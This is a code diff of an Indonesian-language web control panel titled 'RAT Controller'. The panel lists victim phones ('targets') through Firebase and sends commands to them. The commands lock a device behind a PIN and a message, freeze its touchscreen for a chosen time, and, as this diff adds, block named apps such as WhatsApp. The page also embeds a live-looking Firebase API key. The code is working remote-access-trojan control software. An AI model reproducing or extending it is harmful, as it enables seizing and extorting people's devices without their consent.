@@ -2,10 +2,15 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RAT Controller - Lock/Unlock/TouchBlock</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RAT Controller - Full Control</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: #0a0a0a;
             color: #00ff41;
@@ -23,15 +28,21 @@
             border: 2px solid #00ff41;
             border-radius: 15px;
             padding: 20px;
-            box-shadow: 0 0 50px rgba(0,255,65,0.15);
+            box-shadow: 0 0 50px rgba(0, 255, 65, 0.15);
         }
+
+        /* ===== HEADER ===== */
         .header {
             text-align: center;
             border-bottom: 1px solid #00ff41;
             padding-bottom: 12px;
             margin-bottom: 15px;
         }
-        .header h1 { font-size: 20px; text-shadow: 0 0 15px #00ff41; letter-spacing: 2px; }
+        .header h1 {
+            font-size: 20px;
+            text-shadow: 0 0 15px #00ff41;
+            letter-spacing: 2px;
+        }
         .status-badge {
             display: inline-block;
             background: #00ff41;
@@ -42,12 +53,14 @@
             font-size: 11px;
             margin-top: 5px;
         }
+
+        /* ===== TARGET LIST ===== */
         .target-list {
             background: #1a1a1a;
             padding: 10px;
             border-radius: 8px;
             margin: 10px 0;
-            max-height: 200px;
+            max-height: 150px;
             overflow-y: auto;
         }
         .target-item {
@@ -62,14 +75,33 @@
             cursor: pointer;
             gap: 5px;
         }
-        .target-item.active { border-left-color: #ffaa00; background: #1a1a00; }
-        .target-item .info { flex: 1; min-width: 0; }
-        .target-item .name { font-size: 13px; }
-        .target-item .id { font-size: 10px; color: #666; }
-        .target-item .status { font-size: 10px; }
-        .target-item .locked { color: #ff0044; }
-        .target-item .unlocked { color: #00ff41; }
-        .target-item .touchblock { color: #ffaa00; }
+        .target-item.active {
+            border-left-color: #ffaa00;
+            background: #1a1a00;
+        }
+        .target-item .info {
+            flex: 1;
+            min-width: 0;
+        }
+        .target-item .name {
+            font-size: 13px;
+        }
+        .target-item .id {
+            font-size: 10px;
+            color: #666;
+        }
+        .target-item .status {
+            font-size: 10px;
+        }
+        .target-item .locked {
+            color: #ff0044;
+        }
+        .target-item .unlocked {
+            color: #00ff41;
+        }
+        .target-item .touchblock {
+            color: #ffaa00;
+        }
         .target-item .btn-delete {
             background: #ff0044;
             color: #fff;
@@ -81,10 +113,8 @@
             font-weight: bold;
             flex-shrink: 0;
         }
-        .target-item .btn-delete:hover {
-            background: #cc0033;
-        }
-        
+
+        /* ===== SECTIONS ===== */
         .section {
             background: #1a1a1a;
             padding: 15px;
@@ -99,8 +129,11 @@
             border-bottom: 1px solid #333;
             padding-bottom: 8px;
         }
-        .section-title .icon { margin-right: 8px; }
-        
+        .section-title .icon {
+            margin-right: 8px;
+        }
+
+        /* ===== PIN ===== */
         .pin-dots {
             display: flex;
             justify-content: center;
@@ -129,9 +162,13 @@
             text-align: center;
             font-weight: bold;
         }
-        .pin-dot input:focus { outline: none; }
-        
-        .message-area textarea {
+        .pin-dot input:focus {
+            outline: none;
+        }
+
+        /* ===== INPUT & TEXTAREA ===== */
+        .message-area textarea,
+        .block-input input {
             width: 100%;
             padding: 10px;
             background: #000;
@@ -140,9 +177,20 @@
             border-radius: 8px;
             font-size: 13px;
             resize: vertical;
+        }
+        .message-area textarea {
             min-height: 50px;
         }
-        
+        .block-input {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .block-input input {
+            flex: 1;
+        }
+
+        /* ===== DURASI ===== */
         .touch-duration {
             display: flex;
             gap: 10px;
@@ -164,12 +212,12 @@
             font-size: 16px;
             text-align: center;
         }
-        .touch-duration input:focus { border-color: #00ff41; outline: none; }
         .touch-duration span {
             color: #666;
             font-size: 12px;
         }
-        
+
+        /* ===== BUTTONS ===== */
         .btn-group {
             display: flex;
             gap: 10px;
@@ -189,14 +237,53 @@
             letter-spacing: 1px;
             min-width: 80px;
         }
-        .btn-lock { background: #00ff41; color: #000; }
-        .btn-lock:hover { background: #00cc33; transform: scale(1.02); }
-        .btn-unlock { background: #ff0044; color: #fff; }
-        .btn-unlock:hover { background: #cc0033; transform: scale(1.02); }
-        .btn-touch { background: #ffaa00; color: #000; }
-        .btn-touch:hover { background: #dd8800; transform: scale(1.02); }
-        .btn:disabled { opacity: 0.3; cursor: not-allowed; transform: none; }
-        
+        .btn-lock {
+            background: #00ff41;
+            color: #000;
+        }
+        .btn-lock:hover {
+            background: #00cc33;
+            transform: scale(1.02);
+        }
+        .btn-unlock {
+            background: #ff0044;
+            color: #fff;
+        }
+        .btn-unlock:hover {
+            background: #cc0033;
+            transform: scale(1.02);
+        }
+        .btn-touch {
+            background: #ffaa00;
+            color: #000;
+        }
+        .btn-touch:hover {
+            background: #dd8800;
+            transform: scale(1.02);
+        }
+        .btn-block {
+            background: #ff00ff;
+            color: #000;
+        }
+        .btn-block:hover {
+            background: #cc00cc;
+            transform: scale(1.02);
+        }
+        .btn-unblock {
+            background: #ff0044;
+            color: #fff;
+        }
+        .btn-unblock:hover {
+            background: #cc0033;
+            transform: scale(1.02);
+        }
+        .btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ===== LOG ===== */
         .log {
             margin-top: 12px;
             padding: 10px;
@@ -207,13 +294,29 @@
             font-size: 11px;
             border: 1px solid #222;
         }
-        .log .success { color: #00ff41; }
-        .log .error { color: #ff0044; }
-        .log .info { color: #ffaa00; }
-        .log .action { color: #00ccff; }
-        .log .touch { color: #ffaa00; }
-        .log .delete { color: #ff0044; }
-        
+        .log .success {
+            color: #00ff41;
+        }
+        .log .error {
+            color: #ff0044;
+        }
+        .log .info {
+            color: #ffaa00;
+        }
+        .log .action {
+            color: #00ccff;
+        }
+        .log .touch {
+            color: #ffaa00;
+        }
+        .log .delete {
+            color: #ff0044;
+        }
+        .log .block {
+            color: #ff00ff;
+        }
+
+        /* ===== INFO BOX ===== */
         .info-box {
             background: #1a1a1a;
             padding: 10px;
@@ -222,29 +325,55 @@
             font-size: 12px;
             border-left: 3px solid #00ff41;
         }
-        .info-box span { color: #666; }
-        
+        .info-box span {
+            color: #666;
+        }
+
+        /* ===== BLOCK STATUS ===== */
+        #blockStatusText {
+            color: #00ff41;
+        }
+
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .container { padding: 12px; }
-            .pin-dot { width: 32px; height: 42px; font-size: 18px; line-height: 38px; }
-            .btn { padding: 12px; font-size: 11px; min-width: 60px; }
-            .target-item .btn-delete { padding: 2px 8px; font-size: 10px; }
+            .container {
+                padding: 12px;
+            }
+            .pin-dot {
+                width: 32px;
+                height: 42px;
+                font-size: 18px;
+                line-height: 38px;
+            }
+            .btn {
+                padding: 12px;
+                font-size: 11px;
+                min-width: 60px;
+            }
+            .target-item .btn-delete {
+                padding: 2px 8px;
+                font-size: 10px;
+            }
         }
     </style>
 </head>
 <body>
+
     <div class="container" id="app">
+        <!-- HEADER -->
         <div class="header">
             <h1>⚡ RAT CONTROLLER</h1>
             <div class="status-badge" id="statusBadge">● ONLINE</div>
         </div>
 
+        <!-- TARGET LIST -->
         <div class="target-list" id="targetList">
             <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
                 Menunggu target terhubung...
             </div>
         </div>
 
+        <!-- INFO BOX -->
         <div class="info-box">
             <span>Target:</span> <span id="deviceName">-</span><br>
             <span>Status:</span> <span id="deviceStatus">-</span>
@@ -269,7 +398,7 @@
             </div>
         </div>
 
-        <!-- SECTION 2: TOUCH BLOCK -->
+        <!-- SECTION 2: FREEZE HP -->
         <div class="section" style="border-color:#ffaa00;">
             <div class="section-title" style="color:#ffaa00;"><span class="icon">✋</span> TOUCH BLOCK (FREEZE HP)</div>
             <div class="touch-duration">
@@ -285,16 +414,41 @@
             </div>
         </div>
 
+        <!-- SECTION 3: BLOKIR APLIKASI -->
+        <div class="section" style="border-color:#ff00ff;">
+            <div class="section-title" style="color:#ff00ff;"><span class="icon">⛔</span> BLOKIR APLIKASI</div>
+            <div style="color:#ff00ff; font-size:11px; margin-bottom:10px;">
+                ⚡ Masukkan nama aplikasi (contoh: YouTube, WhatsApp, Instagram)
+            </div>
+            <div class="block-input">
+                <input type="text" id="blockAppInput" placeholder="Nama aplikasi...">
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-block" id="blockAppBtn" disabled>⛔ BLOKIR</button>
+                <button class="btn btn-unblock" id="unblockAppBtn" disabled>🔓 UNBLOKIR</button>
+            </div>
+            <div style="color:#666; font-size:11px; margin-top:10px; text-align:center;">
+                Status: <span id="blockStatusText">Tidak ada aplikasi diblokir</span>
+            </div>
+        </div>
+
+        <!-- LOG -->
         <div class="log" id="logArea">
             <div class="info">[SYSTEM] Menunggu koneksi Firebase...</div>
         </div>
     </div>
 
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <!-- ============================================================
+    FIREBASE SDK
+    ============================================================ -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
+    </script>
+
     <script>
         // ============================================================
-        // 🔥 FIREBASE CONFIG
+        // 🔥 FIREBASE CONFIG (GANTI DENGAN PUNYA ANDA)
         // ============================================================
         const firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
@@ -309,8 +463,12 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
+        // ============================================================
+        // VARIABLES
+        // ============================================================
         let selectedTarget = null;
         let targets = {};
+        let blockedApp = '';
 
         const targetList = document.getElementById('targetList');
         const deviceName = document.getElementById('deviceName');
@@ -318,13 +476,19 @@
         const lockBtn = document.getElementById('lockBtn');
         const unlockBtn = document.getElementById('unlockBtn');
         const touchBlockBtn = document.getElementById('touchBlockBtn');
+        const blockAppBtn = document.getElementById('blockAppBtn');
+        const unblockAppBtn = document.getElementById('unblockAppBtn');
         const logArea = document.getElementById('logArea');
+        const blockStatusText = document.getElementById('blockStatusText');
 
+        // ============================================================
+        // FUNCTIONS
+        // ============================================================
         function getPin() {
             return document.getElementById('pin1').value +
-                   document.getElementById('pin2').value +
-                   document.getElementById('pin3').value +
-                   document.getElementById('pin4').value;
+                document.getElementById('pin2').value +
+                document.getElementById('pin3').value +
+                document.getElementById('pin4').value;
         }
 
         function getMessage() {
@@ -339,7 +503,9 @@
             const div = document.createElement('div');
             div.className = type;
             const d = new Date();
-            const time = String(d.getHours()).padStart(2,'0') + ':' + String(d.getMinutes()).padStart(2,'0') + ':' + String(d.getSeconds()).padStart(2,'0');
+            const time = String(d.getHours()).padStart(2, '0') + ':' +
+                String(d.getMinutes()).padStart(2, '0') + ':' +
+                String(d.getSeconds()).padStart(2, '0');
             div.textContent = '[' + time + '] ' + text;
             logArea.appendChild(div);
             logArea.scrollTop = logArea.scrollHeight;
@@ -348,35 +514,38 @@
             }
         }
 
-        // ============ LISTEN TARGETS ============
+        // ============================================================
+        // LISTEN TARGETS
+        // ============================================================
         db.ref('targets').on('value', function(snapshot) {
             const data = snapshot.val();
             targets = data || {};
             renderTargetList();
-            
+
             if (!selectedTarget && Object.keys(targets).length > 0) {
                 const firstId = Object.keys(targets)[0];
                 selectTarget(firstId);
             }
-            
+
             if (selectedTarget && targets[selectedTarget]) {
                 updateInfo(selectedTarget);
             } else if (selectedTarget && !targets[selectedTarget]) {
-                // Target yang dipilih sudah dihapus
                 selectedTarget = null;
                 updateInfo(null);
             }
         });
 
-        // ============ RENDER TARGET LIST ============
+        // ============================================================
+        // RENDER TARGET LIST
+        // ============================================================
         function renderTargetList() {
             const keys = Object.keys(targets);
             if (keys.length === 0) {
                 targetList.innerHTML = `
-                    <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
-                        ⚠️ Tidak ada target terhubung
-                    </div>
-                `;
+                        <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
+                            ⚠️ Tidak ada target terhubung
+                        </div>
+                    `;
                 return;
             }
 
@@ -392,36 +561,36 @@
                     statusText = '🔒 LOCKED';
                     statusClass = 'locked';
                 }
-                
+
                 const div = document.createElement('div');
                 div.className = 'target-item' + (selectedTarget === id ? ' active' : '');
                 div.innerHTML = `
-                    <div class="info" data-id="${id}">
-                        <div class="name">${t.deviceName || 'Unknown'}</div>
-                        <div class="id">${id.slice(0,8)}</div>
-                        <div class="status ${statusClass}">${statusText}</div>
-                    </div>
-                    <button class="btn-delete" data-id="${id}">✕ HAPUS</button>
-                `;
-                
-                // Klik pada info = pilih target
+                        <div class="info" data-id="${id}">
+                            <div class="name">${t.deviceName || 'Unknown'}</div>
+                            <div class="id">${id.slice(0,8)}</div>
+                            <div class="status ${statusClass}">${statusText}</div>
+                        </div>
+                        <button class="btn-delete" data-id="${id}">✕ HAPUS</button>
+                    `;
+
                 div.querySelector('.info').onclick = function() {
                     selectTarget(id);
                 };
-                
-                // Klik tombol hapus
+
                 div.querySelector('.btn-delete').onclick = function(e) {
                     e.stopPropagation();
                     deleteTarget(id);
                 };
-                
+
                 targetList.appendChild(div);
             });
         }
 
-        // ============ DELETE TARGET ============
+        // ============================================================
+        // DELETE TARGET
+        // ============================================================
         function deleteTarget(id) {
-            const name = targets[id] ? targets[id].deviceName || id.slice(0,8) : id.slice(0,8);
+            const name = targets[id] ? targets[id].deviceName || id.slice(0, 8) : id.slice(0, 8);
             if (confirm('⚠️ Hapus target "' + name + '"?')) {
                 db.ref('targets/' + id).remove().then(function() {
                     addLog('🗑️ TARGET DIHAPUS: ' + name, 'delete');
@@ -435,21 +604,27 @@
             }
         }
 
-        // ============ SELECT TARGET ============
+        // ============================================================
+        // SELECT TARGET
+        // ============================================================
         function selectTarget(id) {
             selectedTarget = id;
             renderTargetList();
             updateInfo(id);
-            
+
             if (targets[id]) {
                 lockBtn.disabled = false;
                 unlockBtn.disabled = false;
                 touchBlockBtn.disabled = false;
-                addLog('Target selected: ' + (targets[id].deviceName || id.slice(0,8)), 'action');
+                blockAppBtn.disabled = false;
+                unblockAppBtn.disabled = false;
+                addLog('Target selected: ' + (targets[id].deviceName || id.slice(0, 8)), 'action');
             }
         }
 
-        // ============ UPDATE INFO ============
+        // ============================================================
+        // UPDATE INFO
+        // ============================================================
         function updateInfo(id) {
             const t = targets[id];
             if (!t) {
@@ -458,6 +633,8 @@
                 lockBtn.disabled = true;
                 unlockBtn.disabled = true;
                 touchBlockBtn.disabled = true;
+                blockAppBtn.disabled = true;
+                unblockAppBtn.disabled = true;
                 return;
             }
             deviceName.textContent = t.deviceName || 'Unknown';
@@ -471,9 +648,13 @@
             lockBtn.disabled = false;
             unlockBtn.disabled = false;
             touchBlockBtn.disabled = false;
+            blockAppBtn.disabled = false;
+            unblockAppBtn.disabled = false;
         }
 
-        // ============ LOCK ============
+        // ============================================================
+        // LOCK
+        // ============================================================
         document.getElementById('lockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
@@ -496,13 +677,15 @@
                 lockTime: Date.now(),
                 touchBlocked: false
             }).then(function() {
-                addLog('🔒 DEVICE LOCKED: ' + selectedTarget.slice(0,8) + ' | PIN: ' + pin, 'success');
+                addLog('🔒 DEVICE LOCKED: ' + selectedTarget.slice(0, 8) + ' | PIN: ' + pin, 'success');
             }).catch(function(err) {
                 addLog('Gagal lock: ' + err.message, 'error');
             });
         };
 
-        // ============ UNLOCK ============
+        // ============================================================
+        // UNLOCK
+        // ============================================================
         document.getElementById('unlockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
@@ -516,13 +699,15 @@
                 message: null,
                 touchBlocked: false
             }).then(function() {
-                addLog('🔓 DEVICE UNLOCKED: ' + selectedTarget.slice(0,8), 'success');
+                addLog('🔓 DEVICE UNLOCKED: ' + selectedTarget.slice(0, 8), 'success');
             }).catch(function(err) {
                 addLog('Gagal unlock: ' + err.message, 'error');
             });
         };
 
-        // ============ TOUCH BLOCK ============
+        // ============================================================
+        // TOUCH BLOCK (FREEZE)
+        // ============================================================
         document.getElementById('touchBlockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
@@ -544,14 +729,14 @@
                 pin: null,
                 message: null
             }).then(function() {
-                addLog('✋ HP FREEZE: ' + selectedTarget.slice(0,8) + ' | Durasi: ' + duration + ' detik', 'touch');
+                addLog('✋ HP FREEZE: ' + selectedTarget.slice(0, 8) + ' | Durasi: ' + duration + ' detik', 'touch');
                 setTimeout(function() {
                     ref.update({
                         touchBlocked: false,
                         touchDuration: null,
                         touchBlockTime: null
                     }).then(function() {
-                        addLog('✅ HP UNFREEZE: ' + selectedTarget.slice(0,8) + ' (otomatis)', 'success');
+                        addLog('✅ HP UNFREEZE: ' + selectedTarget.slice(0, 8) + ' (otomatis)', 'success');
                     }).catch(function() {});
                 }, duration * 1000);
             }).catch(function(err) {
@@ -559,7 +744,78 @@
             });
         };
 
+        // ============================================================
+        // BLOKIR APLIKASI
+        // ============================================================
+        document.getElementById('blockAppBtn').onclick = function() {
+            if (!selectedTarget || !targets[selectedTarget]) {
+                addLog('Pilih target terlebih dahulu!', 'error');
+                return;
+            }
+
+            const appName = document.getElementById('blockAppInput').value.trim();
+            if (!appName) {
+                addLog('Masukkan nama aplikasi!', 'error');
+                return;
+            }
+
+            // Simpan ke Firebase
+            const ref = db.ref('targets/' + selectedTarget);
+            ref.update({
+                blockedApp: appName,
+                blockActive: true
+            }).then(function() {
+                addLog('⛔ APLIKASI DIBLOKIR: ' + appName, 'block');
+                blockStatusText.textContent = '🔴 ' + appName + ' diblokir';
+                blockStatusText.style.color = '#ff0044';
+                document.getElementById('blockAppInput').value = '';
+            }).catch(function(err) {
+                addLog('Gagal blokir: ' + err.message, 'error');
+            });
+        };
+
+        // ============================================================
+        // UNBLOKIR APLIKASI
+        // ============================================================
+        document.getElementById('unblockAppBtn').onclick = function() {
+            if (!selectedTarget || !targets[selectedTarget]) {
+                addLog('Pilih target terlebih dahulu!', 'error');
+                return;
+            }
+
+            const ref = db.ref('targets/' + selectedTarget);
+            ref.update({
+                blockedApp: null,
+                blockActive: false
+            }).then(function() {
+                addLog('🔓 APLIKASI DIUNBLOKIR', 'success');
+                blockStatusText.textContent = '✅ Tidak ada aplikasi diblokir';
+                blockStatusText.style.color = '#00ff41';
+                document.getElementById('blockAppInput').value = '';
+            }).catch(function(err) {
+                addLog('Gagal unblokir: ' + err.message, 'error');
+            });
+        };
+
+        // ============================================================
+        // LISTEN BLOCK STATUS DARI TARGET
+        // ============================================================
+        db.ref('targets').on('value', function(snapshot) {
+            const data = snapshot.val();
+            if (data && selectedTarget && data[selectedTarget]) {
+                const t = data[selectedTarget];
+                if (t.blockActive && t.blockedApp) {
+                    blockStatusText.textContent = '🔴 ' + t.blockedApp + ' diblokir';
+                    blockStatusText.style.color = '#ff0044';
+                } else {
+                    blockStatusText.textContent = '✅ Tidak ada aplikasi diblokir';
+                    blockStatusText.style.color = '#00ff41';
+                }
+            }
+        });
+
         addLog('Firebase connected, menunggu target...', 'info');
     </script>
+
 </body>
 </html>
